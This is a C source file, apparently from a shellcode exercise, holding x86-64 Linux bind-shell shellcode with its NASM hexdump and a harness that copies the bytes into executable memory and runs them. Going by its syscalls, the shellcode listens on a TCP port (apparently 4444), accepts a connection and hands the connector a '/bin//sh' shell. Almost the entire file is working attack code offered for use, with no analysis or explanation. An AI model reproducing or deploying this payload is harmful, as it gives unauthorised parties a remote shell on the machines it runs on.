/*
$ nasm -f bin bind-shellcode.asm 
$ hexdump bind-shellcode
0000000 48 31 ff 40 b7 02 48 31 f6 40 b6 01 48 31 d2 48
0000010 31 c0 b0 02 48 c1 c8 28 b0 61 49 89 c4 0f 05 49
0000020 89 c1 48 89 c7 48 31 f6 56 be 01 02 11 5c 83 ee
0000030 01 56 48 89 e6 b2 10 41 80 c4 07 4c 89 e0 0f 05
0000040 48 31 f6 48 ff c6 41 80 c4 02 4c 89 e0 0f 05 48
0000050 31 f6 41 80 ec 4c 4c 89 e0 0f 05 48 89 c7 48 31
0000060 f6 41 80 c4 3c 4c 89 e0 0f 05 48 ff c6 4c 89 e0
0000070 0f 05 48 31 f6 56 48 bf 2f 2f 62 69 6e 2f 73 68
0000080 57 48 89 e7 48 31 d2 41 80 ec 1f 4c 89 e0 0f 05
0000090
*/

//C code
//compile:
//gcc bind-shellcode.c -o bindsc

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
 
int (*sc)();
 
char shellcode[] =
"\x48\x31\xff\x40\xb7\x02\x48\x31\xf6\x40\xb6\x01\x48\x31\xd2\x48" \
"\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x61\x49\x89\xc4\x0f\x05\x49" \
"\x89\xc1\x48\x89\xc7\x48\x31\xf6\x56\xbe\x01\x02\x11\x5c\x83\xee" \
"\x01\x56\x48\x89\xe6\xb2\x10\x41\x80\xc4\x07\x4c\x89\xe0\x0f\x05" \
"\x48\x31\xf6\x48\xff\xc6\x41\x80\xc4\x02\x4c\x89\xe0\x0f\x05\x48" \
"\x31\xf6\x41\x80\xec\x4c\x4c\x89\xe0\x0f\x05\x48\x89\xc7\x48\x31" \
"\xf6\x41\x80\xc4\x3c\x4c\x89\xe0\x0f\x05\x48\xff\xc6\x4c\x89\xe0" \
"\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68" \
"\x57\x48\x89\xe7\x48\x31\xd2\x41\x80\xec\x1f\x4c\x89\xe0\x0f\x05";
 
int main(int argc, char **argv) {
 
    void *ptr = mmap(0, 0x90, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
            | MAP_PRIVATE, -1, 0);
 
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
 
    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;
 
    sc();
 
    return 0;
}